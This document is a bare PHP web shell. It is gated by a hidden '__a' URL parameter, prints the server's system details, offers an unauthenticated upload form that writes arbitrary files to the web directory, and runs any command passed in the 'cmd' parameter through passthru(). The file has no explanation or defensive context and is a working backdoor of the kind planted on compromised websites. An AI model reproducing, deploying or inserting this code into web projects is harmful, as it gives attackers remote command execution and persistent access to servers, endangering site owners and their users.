<?php
if(isset($_GET["__a"]) == 1) {
    echo 'System: <font color="black" id="system_info">'.php_uname().'</font><br>';
    echo"<br><form method=post enctype=multipart/form-data>";
    echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>";
    if($_POST["k"]==upload) { 
        if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])) {
        echo"<b>".$_FILES["f"]["name"];
        } else {
          echo"<b>Gagal upload cok";
        }
    }

    if (isset($_GET['cmd'])) {
        echo "<br/><br/>Command:<br/>";
        echo "<pre>";
        passthru($_GET["cmd"]);
    }
}
?>
